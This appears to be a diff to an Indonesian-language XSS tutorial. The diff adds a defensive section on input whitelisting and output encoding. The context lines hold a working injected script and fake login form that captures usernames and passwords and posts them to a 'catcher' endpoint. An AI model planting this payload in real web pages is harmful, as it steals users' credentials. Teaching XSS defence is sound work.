@@ -21,3 +21,8 @@ http.send(params);
 <script>function kirim(){var http = new XMLHttpRequest();var params = "PROPERTY=yes&username="+document.getElementById("username").value + "&password="+document.getElementById("password").value;http.open("POST", "catcher", true);http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.send(params);}</script>
 <br>Username : <input id=username><br>Password : <input type=password id=password><br><button type='button' onclick='kirim()'>Login</button>
 ```
+
+## Solusi ##
+
+* Validasi Input dengan Whitelisting : membuat daftar karakter yang diijinkan untuk diinput ke dalam form
+* Output Encoding : mengganti karakter khusus dalam HTML (misalnya `<` dan `>`) menjadi representasi visualnya (misalnya `&lt;` dan `&gt;`)
